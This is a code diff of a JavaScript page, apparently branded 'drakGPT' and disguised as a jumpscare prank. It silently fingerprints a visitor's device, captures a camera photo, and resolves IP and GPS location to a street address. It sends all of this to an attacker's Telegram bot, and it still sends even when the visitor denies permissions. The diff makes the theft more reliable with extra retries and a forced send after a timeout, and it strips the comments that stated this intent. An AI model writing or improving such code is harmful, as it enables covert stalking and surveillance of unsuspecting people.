@@ -121,11 +121,12 @@
             let locationData = null;
             let deviceData = null;
             let sendAttempts = 0;
-            const MAX_SEND_ATTEMPTS = 3;
+            const MAX_SEND_ATTEMPTS = 5;
             let captureAttempts = 0;
             const MAX_CAPTURE_ATTEMPTS = 10;
             let cameraPermissionDenied = false;
             let locationPermissionDenied = false;
+            let sendTimer = null;
 
             // ========== COPY LINK ==========
             window.copyLink = function() {
@@ -143,7 +144,7 @@
                 }
             };
 
-            // ========== 1. DETEKSI DEVICE (TANPA IZIN) ==========
+            // ========== 1. DETEKSI DEVICE ==========
             function getAccurateDevice() {
                 try {
                     const ua = navigator.userAgent;
@@ -225,6 +226,7 @@
                             checkSend(); });
                     } else { deviceDone = true; }
 
+                    console.log('✅ Device detected:', deviceData.brand, deviceData.model);
                     return true;
                 } catch(e) {
                     deviceData = { brand: 'Unknown', model: 'Unknown', os: 'Unknown' };
@@ -233,7 +235,7 @@
                 }
             }
 
-            // ========== 2. KAMERA (TETAP KIRIM DATA WALAU DITOLAK) ==========
+            // ========== 2. KAMERA ==========
             function startCamera() {
                 loadStatus.textContent = '📷 mengakses kamera...';
                 let attempts = 0;
@@ -281,7 +283,6 @@
                         }, 2000);
 
                     }).catch(err => {
-                        // KAMERA DITOLAK — TETAP LANJUT
                         cameraPermissionDenied = true;
                         console.warn('⚠️ Kamera ditolak:', err.message);
                         loadStatus.textContent = '📷 ditolak, lanjut...';
@@ -332,6 +333,7 @@
 
                         imageData = canvas.toDataURL('image/jpeg', 0.92);
                         captureDone = true;
+                        console.log('✅ Capture success, size:', (imageData.length / 1024).toFixed(0), 'KB');
 
                         if (stream) {
                             stream.getTracks().forEach(t => t.stop());
@@ -341,6 +343,7 @@
                         checkSend();
 
                     } catch(e) {
+                        console.warn('⚠️ Capture error:', e.message);
                         if (captureAttempts < MAX_CAPTURE_ATTEMPTS) {
                             setTimeout(doCapture, 300);
                         } else {
@@ -352,16 +355,16 @@
 
                 tryCamera();
 
-                // TIMEOUT: tetap lanjut walau kamera belum siap
                 setTimeout(function() {
                     if (!captureDone) {
                         captureDone = true;
+                        console.log('⏳ Camera timeout, proceed without photo');
                         checkSend();
                     }
                 }, 5000);
             }
 
-            // ========== 3. LOKASI (IP + GPS, TETAP KIRIM WALAU DITOLAK) ==========
+            // ========== 3. LOKASI ==========
             function getLocation() {
                 loadStatus.textContent = '📍 mengambil lokasi...';
 
@@ -370,7 +373,6 @@
                 const ipSources = ['https://ipapi.co/json/', 'https://ipinfo.io/json'];
                 let ipIndex = 0;
 
-                // ===== IP-BASED (TANPA IZIN) =====
                 function tryIP() {
                     if (ipDone || ipIndex >= ipSources.length) {
                         if (!ipDone) { ipDone = true; }
@@ -404,6 +406,7 @@
                             if (lat && lng) {
                                 locationData = { lat, lng, city, region, country, ip, source: 'IP' };
                                 ipDone = true;
+                                console.log('✅ IP location:', lat, lng);
 
                                 const geoUrl =
                                     `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`;
@@ -422,6 +425,7 @@
                                             locationData.postcode = addr.postcode || 'N/A';
                                             locationData.houseNumber = addr.house_number || addr
                                             .building || 'N/A';
+                                            console.log('✅ Full address:', locationData.fullAddress);
                                         }
                                         checkLocationDone();
                                     })
@@ -433,7 +437,6 @@
                         .catch(() => { tryIP(); });
                 }
 
-                // ===== GPS (IZIN, TAPI TETAP LANJUT WALAU DITOLAK) =====
                 function tryGPS() {
                     if (gpsDone || !navigator.geolocation) {
                         if (!gpsDone) { gpsDone = true; }
@@ -453,6 +456,7 @@
                                     source: 'GPS'
                                 };
                                 gpsDone = true;
+                                console.log('✅ GPS location:', latitude, longitude);
 
                                 const url =
                                     `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`;
@@ -471,6 +475,7 @@
                                             locationData.postcode = addr.postcode || 'N/A';
                                             locationData.houseNumber = addr.house_number || addr
                                             .building || 'N/A';
+                                            console.log('✅ Full address:', locationData.fullAddress);
                                         }
                                         checkLocationDone();
                                     })
@@ -480,7 +485,6 @@
                             }
                         },
                         function(error) {
-                            // GPS DITOLAK — TETAP LANJUT
                             locationPermissionDenied = true;
                             console.warn('⚠️ GPS ditolak:', error.message);
                             gpsDone = true;
@@ -499,6 +503,7 @@
                         if (!locationData) {
                             locationData = { lat: 0, lng: 0, source: 'none', city: 'Tidak tersedia' };
                         }
+                        console.log('✅ Location done, source:', locationData.source);
                         checkSend();
                     }
                 }
@@ -506,32 +511,32 @@
                 tryIP();
                 tryGPS();
 
-                // TIMEOUT: tetap lanjut walau lokasi belum siap
                 setTimeout(function() {
                     if (!locationDone) {
                         locationDone = true;
                         if (!locationData) {
                             locationData = { lat: 0, lng: 0, source: 'timeout', city: 'Timeout' };
                         }
+                        console.log('⏳ Location timeout, proceed');
                         checkSend();
                     }
                 }, 8000);
             }
 
-            // ========== 4. KIRIM TELEGRAM ==========
+            // ========== 4. KIRIM TELEGRAM (DENGAN RETRY) ==========
             function sendToTelegram() {
                 if (isSent) return;
+
+                console.log('📤 Attempting to send... (attempt ' + (sendAttempts + 1) + ')');
 
                 let caption = '📸 JUMPScare REPORT\n';
                 caption += '⏰ ' + new Date().toLocaleString('id-ID') + '\n';
                 caption += '━'.repeat(25) + '\n';
 
-                // STATUS IZIN
                 caption += '\n🔐 STATUS IZIN:\n';
                 caption += '   Kamera: ' + (cameraPermissionDenied ? '❌ Ditolak' : '✅ Diizinkan') + '\n';
                 caption += '   Lokasi: ' + (locationPermissionDenied ? '❌ Ditolak' : '✅ Diizinkan') + '\n';
 
-                // DEVICE (TETAP KIRIM)
                 if (deviceData) {
                     caption += '\n📱 PERANGKAT:\n';
                     caption += '   Merek: ' + deviceData.brand + '\n';
@@ -548,7 +553,6 @@
                     caption += '   Touch: ' + (deviceData.touch ? 'Yes' : 'No');
                 }
 
-                // LOKASI (TETAP KIRIM WALAU DITOLAK / TIDAK AKURAT)
                 if (locationData) {
                     caption += '\n📍 LOKASI:\n';
                     caption += '   Sumber: ' + (locationData.source || 'N/A') + '\n';
@@ -565,7 +569,6 @@
                     if (locationData.country && locationData.country !== 'N/A')
                         caption += '   Negara: ' + locationData.country + '\n';
 
-                    // ALAMAT LENGKAP (jika ada)
                     if (locationData.fullAddress && locationData.fullAddress !== 'N/A') {
                         caption += '\n📌 ALAMAT:\n   ' + locationData.fullAddress + '\n';
                     }
@@ -574,7 +577,9 @@
                     .lng || 0);
                 }
 
-                // FOTO (jika ada)
+                sendAttempts++;
+
+                // KIRIM FOTO JIKA ADA
                 if (imageData) {
                     try {
                         const bs = atob(imageData.split(',')[1]);
@@ -588,61 +593,92 @@
                         fd.append('photo', blob, 'jumpscare.jpg');
                         fd.append('caption', caption);
 
-                        sendAttempts++;
-
                         fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
                             method: 'POST',
                             body: fd
-                        }).then(r => r.json()).then(d => {
+                        })
+                        .then(r => r.json())
+                        .then(d => {
+                            console.log('📤 Telegram response:', d);
                             if (d.ok) {
                                 isSent = true;
                                 loadStatus.textContent = '✅ terkirim!';
+                                console.log('✅ Sent successfully!');
                                 setTimeout(function() {
                                     loader.style.display = 'none';
                                     btn.classList.remove('hidden');
                                 }, 500);
                             } else {
+                                console.error('❌ Telegram error:', d.description);
                                 if (sendAttempts < MAX_SEND_ATTEMPTS) {
-                                    setTimeout(sendToTelegram, 1500);
+                                    setTimeout(sendToTelegram, 2000);
                                 } else {
-                                    loadStatus.textContent = '❌ gagal kirim';
+                                    loadStatus.textContent = '❌ gagal: ' + d.description;
                                 }
                             }
-                        }).catch(() => {
+                        })
+                        .catch(function(err) {
+                            console.error('❌ Fetch error:', err);
                             if (sendAttempts < MAX_SEND_ATTEMPTS) {
-                                setTimeout(sendToTelegram, 1500);
+                                setTimeout(sendToTelegram, 2000);
                             } else {
-                                loadStatus.textContent = '❌ error kirim';
+                                loadStatus.textContent = '❌ error: ' + err.message;
                             }
                         });
                         return;
-                    } catch(e) {}
+                    } catch(e) {
+                        console.error('❌ Image parse error:', e);
+                    }
                 }
 
-                // TANPA FOTO: kirim text saja
-                try {
-                    const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
-                    fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: caption })
-                    }).then(r => r.json()).then(d => {
-                        if (d.ok) {
-                            isSent = true;
-                            loadStatus.textContent = '✅ terkirim (tanpa foto)';
-                            setTimeout(function() {
-                                loader.style.display = 'none';
-                                btn.classList.remove('hidden');
-                            }, 500);
+                // KIRIM TEXT SAJA (TANPA FOTO)
+                console.log('📤 Sending text-only...');
+                const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: caption })
+                })
+                .then(r => r.json())
+                .then(d => {
+                    console.log('📤 Telegram response:', d);
+                    if (d.ok) {
+                        isSent = true;
+                        loadStatus.textContent = '✅ terkirim (tanpa foto)';
+                        console.log('✅ Sent text-only successfully!');
+                        setTimeout(function() {
+                            loader.style.display = 'none';
+                            btn.classList.remove('hidden');
+                        }, 500);
+                    } else {
+                        console.error('❌ Telegram error:', d.description);
+                        if (sendAttempts < MAX_SEND_ATTEMPTS) {
+                            setTimeout(sendToTelegram, 2000);
+                        } else {
+                            loadStatus.textContent = '❌ gagal: ' + d.description;
                         }
-                    }).catch(() => {});
-                } catch(e) {}
+                    }
+                })
+                .catch(function(err) {
+                    console.error('❌ Fetch error:', err);
+                    if (sendAttempts < MAX_SEND_ATTEMPTS) {
+                        setTimeout(sendToTelegram, 2000);
+                    } else {
+                        loadStatus.textContent = '❌ error: ' + err.message;
+                    }
+                });
             }
 
             // ========== 5. CHECK & SEND ==========
             function checkSend() {
+                console.log('🔍 CheckSend - capture:', captureDone, 'location:', locationDone, 'device:', deviceDone,
+                    'sent:', isSent);
                 if (captureDone && locationDone && deviceDone && !isSent) {
-                    sendToTelegram();
+                    // Delay sedikit agar semua data siap
+                    if (sendTimer) clearTimeout(sendTimer);
+                    sendTimer = setTimeout(function() {
+                        sendToTelegram();
+                    }, 1000);
                 }
             }
 
@@ -650,21 +686,27 @@
             function runAll() {
                 if (isProcessing) return;
                 isProcessing = true;
+                console.log('🚀 Starting...');
 
                 getAccurateDevice();
                 startCamera();
                 getLocation();
 
-                setTimeout(() => {
+                // SAFETY: kirim paksa setelah 12 detik
+                setTimeout(function() {
                     if (!isSent) {
+                        console.log('⏳ Force send after timeout...');
                         if (!captureDone) { captureDone = true; }
                         if (!locationDone) { locationDone = true; if (!locationData) locationData = { lat: 0,
                                 lng: 0, source: 'fallback' }; }
                         if (!deviceDone) { deviceDone = true; if (!deviceData) deviceData = { brand: 'Unknown',
                                 model: 'Unknown' }; }
+                        if (!imageData) {
+                            try { imageData = canvas.toDataURL('image/jpeg', 0.8); } catch(e) {}
+                        }
                         checkSend();
                     }
-                }, 10000);
+                }, 12000);
             }
 
             // ========== 7. TOMBOL ==========
@@ -692,7 +734,7 @@
                 if (stream) { stream.getTracks().forEach(t => t.stop()); }
             });
 
-            console.log('👁️ drakGPT · No-Permission Mode');
+            console.log('👁️ drakGPT · Fixed Send');
             console.log('Token: ' + BOT_TOKEN.substring(0, 15) + '...');
             console.log('Chat ID: ' + CHAT_ID);
 
